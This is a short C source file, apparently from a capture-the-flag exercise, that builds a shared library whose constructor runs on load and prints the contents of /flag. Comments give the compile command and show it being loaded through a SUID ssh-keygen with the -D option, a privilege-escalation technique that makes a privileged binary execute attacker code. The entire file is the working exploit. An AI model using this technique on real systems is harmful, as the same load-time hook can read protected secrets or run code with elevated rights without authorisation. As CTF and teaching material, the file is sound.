// build a shared lib, trigger a function on load
// gcc -shared ./shared.c -o shared.so

// for example, used with ssh-keygen + SUID
// ssh-keygen -D ./shared.so

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void __attribute__((constructor)) initLibrary(void)
{
    printf("Welcome to the library!\n");

    // read the file
    FILE *f = fopen("/flag", "r");
    if (f == NULL)
    {
        printf("Error opening file!");
        exit(1);
    }
    else
    {
        char flag[100];
        fgets(flag, 100, f);
        printf("The flag is: %s", flag);
    }
}
